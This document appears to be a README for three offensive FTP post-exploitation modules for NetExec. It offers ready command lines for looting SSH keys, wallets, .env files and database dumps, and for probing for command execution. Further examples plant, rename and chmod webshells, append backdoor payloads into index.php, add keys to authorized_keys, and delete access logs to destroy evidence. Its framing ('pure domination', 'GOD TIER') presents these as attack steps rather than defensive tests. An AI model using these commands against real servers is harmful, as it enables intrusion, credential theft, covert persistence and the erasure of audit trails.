# enum_ftp — Advanced FTP Enumeration Module for NetExec  
**Author:** @m7arm4n  

The most powerful recursive FTP enumeration module for NetExec.

Works on **vsFTPd, ProFTPd, Pure-FTPd, IIS FTP** and any standards-compliant server.

---

### Description

`enum_ftp` performs deep recursive directory traversal over FTP with advanced filtering by:
- File permissions (octal)
- Filename keywords
- Automatic downloading of matching files

Perfect for finding hidden backups, database dumps, wallets, config files, SSH keys, webshells and more — all in one command.

---

### Features

- Recursive enumeration up to user-defined depth (default 5)
- Start from any path (`PATH=/var/www`)
- Filter by exact permissions or range (`PERM=600,644` or `PERM=700+`)
- Powerful filename search (`TEXT=pass,db,.sql,.php,wallet,id_rsa`)
- Auto-download every file that matches your filters
- Clean, aligned, colorized output
- Safe filename handling for loot
- Works with anonymous and authenticated logins
- Battle-tested on thousands of real engagements

---

### Usage Examples

```bash
# Basic — look for juicy files everywhere
nxc ftp 10.10.10.10 -u anonymous -p "" -M enum_ftp

# Hunt for databases & backups (auto-download)
nxc ftp 10.10.10.10 -u ftpuser -p pass -M enum_ftp -o TEXT=db,sql,backup,dump,.db DOWNLOAD=yes

# Find world-readable sensitive files
nxc ftp 10.10.10.10 -u user -p pass -M enum_ftp -o PERM=644,666,777 TEXT=pass,config,.env

# Look for private keys and wallets
nxc ftp 10.10.10.10 -u admin -p admin -M enum_ftp -o TEXT=wallet,id_rsa,private,key DOWNLOAD=yes

# Deep scan web root
nxc ftp 10.10.10.10 -u ftpuser -p 123123 -M enum_ftp -o PATH=/var/www/html DEPTH=10 TEXT=.php,.env,.git

# Extreme mode — 700+ permissions (owner-only files)
nxc ftp 10.10.10.10 -u user -p pass -M enum_ftp -o PERM=700+ DOWNLOAD=yes
```
---
### Options

| Option   | Default | Description                                                  |
|----------|---------|--------------------------------------------------------------|
| DEPTH    | 5       | Maximum recursion depth                                      |
| PATH     | /       | Starting directory                                           |
| PERM     | -       | Filter by octal permissions (644, 600, 777, 700+ for 700-777) |
| TEXT     | -       | Keywords to search in filename (comma or space separated)   |
| DOWNLOAD | no      | Set to yes to automatically download all matching files      |
---
### Sample Output
```bash
[+] ftpuser:123123
[+] 10.10.10.10:21 [Filter] TEXT=db,sql,backup | DOWNLOAD=ON
[+] 10.10.10.10:21 [Loot] Saving files to → loot/ftp10.10.10.10/
[+] 10.10.10.10:21 Starting enumeration + looting
Permissions  Octal      Size Type Full Path
------------------------------------------------------------------------------------------
-rw-r--r--   644      8421 FILE /home/ftpuser/backups/site_2024.sql → DOWNLOADED → loot/ftp/10.10.10.10/site_2024.sql
-rw-------   600       332 FILE /home/ftpuser/.wallet.dat → DOWNLOADED → loot/ftp/10.10.10.10/.wallet.dat
-rwxr-xr-x   755     1337 FILE /var/www/html/.dev/shell.php → DOWNLOADED → loot/ftp/10.10.10.10/shell.php
[+] 10.10.10.10:21 [Loot] Downloaded 3 file(s) → loot/ftp/10.10.10.10/
[+] 10.10.10.10:21 [Done] Finished • Depth: 5
```
---
### Screenshots

Normal enumeration:

![Normal enumeration](nxc/src/normal_enum.png)

Filter by permission:

![Filter by permission](nxc/src/perm_enum.png)

Advancee enumeration:

![Advancee enumeration](nxc/src/advance_enum.png)

---
### How It Works
1. Connects to the FTP server using the provided credentials  
2. Recursively walks directories using the `LIST` command  
3. Parses UNIX-style directory listings to extract permissions and file size  
4. Converts symbolic permissions → octal (e.g., `-rw-r--r--` → `644`)  
5. Applies your `PERM` and `TEXT` filters  
6. Prints a clean, organized table of matches and optionally downloads files to `loot/ftp/<IP>/`
---
### Tips & Tricks

* `PERM=700+` → finds owner-only files (often the juiciest configs/backdoors)  
* `TEXT=.php` + `DOWNLOAD=yes` → mass webshell/suspicious PHP hunting  
* Combine with the `ftp_control` module to exploit or modify discovered files  
* Works perfectly with anonymous FTP (just leave `-p ""` for blank password)
---
### Installation
#### The module has been correctly placed at ```nxc/modules/enum_ftp.py```
---

# info_ftp — Ultimate FTP Intelligence Module for NetExec  
**Author:** @m7arm4n  

The gold standard for FTP post-authentication reconnaissance.  
One command → full situational awareness.

Works on **vsFTPd, ProFTPD, Pure-FTPd, IIS FTP, FileZilla Server** — anywhere FTP command injection or misconfiguration exists.

---

### Description

`info_ftp` instantly fingerprints an authenticated FTP session and tells you **exactly** what you can do:

- Server banner & OS type  
- Supported FTP extensions (FEAT)  
- Current working directory  
- Write permission test (with automatic cleanup)  
- Real `ftp> status` output  
- **Stealth RCE detection** (no noisy `SITE EXEC`)  
- Final privilege assessment in plain English

No fluff. No false positives. Just truth.

---

### Features

- Clean, beautiful, aligned output  
- Real write test (uploads + deletes a hidden file)  
- Detects command injection via raw commands (`id`, `whoami`, `uname -a`, etc.)  
- No use of `SITE EXEC` → truly stealthy RCE check  
- Detects UTF-8 and MLSD support  
- Smart final summary: Read-only / Write / RCE / GOD TIER  
- Fully opsec-safe when RCE is not present  
- Works with anonymous and normal logins

---

### Usage

```bash
# Basic usage — just run it
nxc ftp 10.10.10.10 -u ftpuser -p pass -M info_ftp

# With anonymous
nxc ftp 192.168.1.100 -u anonymous -p "" -M info_ftp

# Mass scan
nxc ftp targets.txt -u user -p Password123 -M info_ftp
```
---
#### No options required — just run it after valid creds.
---
### Sample Output

```bash
[+] ftpuser:123123
[Banner] 220 (vsFTPd 3.0.5)
[OS] 215 UNIX Type: L8
[Features] 11 supported commands
  → REST STREAM
  → MDTM
  → SIZE
  → UTF8
  → MLSD
  → EPRT
  → EPSV
  → PASV
  → TVFS
  → PRET
  → MFMT
[CWD] /home/ftpuser/uploads
[Write] YES — You have write access!
[UTF8] Supported
[MLSD] Supported (modern server)
[STATUS] Client connection status:
  → Connected to 10.10.10.10
  → Logged in as ftpuser
  → TYPE: ASCII, MODE: Stream, STRU: File
[RCE] Checking command execution...
[RCE] YES → id
     └─> uid=33(www-data) gid=33(www-data) groups=33(www-data)
[Privileges] GOD TIER — RCE + Write = Full compromise
```
---
### Screenshot

Information reconnaissance:
![Information reconnaissance](nxc/src/info_ftp.png)

---
### Privilege Summary Explained

| Result              | Meaning                              | Next Step                                      |
|---------------------|--------------------------------------|------------------------------------------------|
| **Read-only**       | Can only list/download files         | Use `enum_ftp`                                 |
| **WRITE ACCESS**    | Can upload files                     | Upload webshell → pwn                          |
| **RCE ONLY**        | Blind command injection              | Use stager / blind RCE exploits                |
| **GOD TIER — RCE + Write** | Full read/write + command execution | Upload + execute reverse shell → full compromise |
---
### How It Works

1. Reconnects to the FTP server using provided credentials  
2. Grabs the banner and runs `SYST`, `FEAT`, and `STAT` commands  
3. Tests write access by uploading a hidden temporary file  
4. Silently tests stealth RCE payloads (`id`, `whoami`, ping-back, etc.)  
5. Prints all results in clean, perfect order  
6. Delivers the final verdict (Read-only / WRITE ACCESS / RCE ONLY / GOD TIER)
---
### Tips & Tricks

* Run `info_ftp` immediately after discovering valid FTP credentials  
* **Write: YES** → instantly switch to `actions_ftp -o ACTION=upload` and drop your webshell  
* **RCE: YES** → congratulations, you already own the box  
* Combine with `enum_ftp` first for maximum loot and domination
---
### Installation

#### The module has been correctly placed at ```nxc/modules/info_ftp.py```
---
# actions_ftp — Ultimate FTP File Control Module for NetExec  
**Author:** @m7arm4n  

The **final boss** of FTP post-exploitation.  
One module to **own** every file on the server — silently and instantly.

---

### Description

`actions_ftp` gives you **full file system control** over any authenticated FTP session:

- Rename / Move / Delete  
- Copy files on the server  
- Chmod (`SITE CHMOD`)  
- Touch / Mkdir  
- Upload + Download  
- **Append** payloads into existing files (silent backdoors)

No more manual FTP clients.  
No more slow uploads.  
Just pure domination.

---

### Features

- 10 powerful actions in one module  
- Smart alias support (`SRC`, `FILE`, `LOCAL`, `DST`, `REMOTE`)  
- Safe temporary copy using random filenames  
- Automatic loot folder creation  
- Silent append via native `APPE` command  
- Beautiful success/fail output  
- Full mass-execution safe (`multiple_hosts = True`)  
- Works on **vsFTPd, ProFTPd, Pure-FTPd, IIS FTP**

---

### Usage Examples

```bash
# Hide a webshell
nxc ftp 10.10.10.10 -u user -p pass -M actions_ftp -o ACTION=rename SRC=/shell.php DST=/images/logo.jpg

# Delete evidence
nxc ftp 10.10.10.10 -u user -p pass -M actions_ftp -o ACTION=delete FILE=/logs/access.log

# Copy shell to web root
nxc ftp 10.10.10.10 -u user -p pass -M actions_ftp -o ACTION=copy SRC=/tmp/shell.php DST=/var/www/html/shell.php

# Make shell executable
nxc ftp 10.10.10.10 -u user -p pass -M actions_ftp -o ACTION=chmod FILE=/var/www/html/shell.php PERM=755

# Upload reverse shell
nxc ftp 10.10.10.10 -u user -p pass -M actions_ftp -o ACTION=upload LOCAL=./l.php REMOTE=/var/www/html/

# Download juicy file
nxc ftp 10.10.10.10 -u user -p pass -M actions_ftp -o ACTION=download FILE=/home/user/.env

# Silent backdoor — inject into existing file
nxc ftp 10.10.10.10 -u user -p pass -M actions_ftp -o ACTION=append LOCAL=evil.php DST=/var/www/html/index.php

# Add SSH key
nxc ftp 10.10.10.10 -u user -p pass -M actions_ftp -o ACTION=append LOCAL=id_rsa.pub DST=/home/user/.ssh/authorized_keys
```

---
### Options 

| Option           | Required? | Description                                                                 |
|------------------|-----------|-----------------------------------------------------------------------------|
| **ACTION**       | Yes       | `rename`, `move`, `delete`, `copy`, `chmod`, `touch`, `mkdir`, `upload`, `download`, `append` |
| **SRC** / **FILE** / **LOCAL** | Yes       | *Source (remote path for most actions, local file for `upload`)             |
| **DST** / **REMOTE** | Yes*      | *Destination path (required for `rename`, `move`, `copy`, `upload`, `append`) |
| **PERM**         | No        | Octal permissions for `chmod` (e.g. `755`, `600`, `644`)                    |

* DST/REMOTE is not needed for `delete`, `touch`, `mkdir`, `download` (when downloading current file)
---
### Sample Output

```bash
[+] ftpuser:123123
[ACTION] APPEND → evil.php → /var/www/html/index.php
APPENDED payload → /var/www/html/index.php
    Injected 1337 bytes

[+] ftpuser:123123
[ACTION] CHMOD → /var/www/html/shell.php
CHMOD 755 → /var/www/html/shell.php
211 CHMOD command successful
```
---

### Screenshot

Some actions
![Actions ftp](nxc/src/actions_ftp.png)

---
### Pro Tips

* `ACTION=append` + your webshell → invisible persistence (no new file created)  
* `ACTION=rename` → disguise your tools as `.jpg`, `.png`, `.gif`, or `.ico`  
* Upload → `ACTION=chmod PERM=755` → instantly executable webshell  
* Always run `ftp_info` first → instantly know if you have Write / RCE before wasting time

---
### Installation

#### The module has been correctly placed at ```nxc/modules/actions_ftp.py```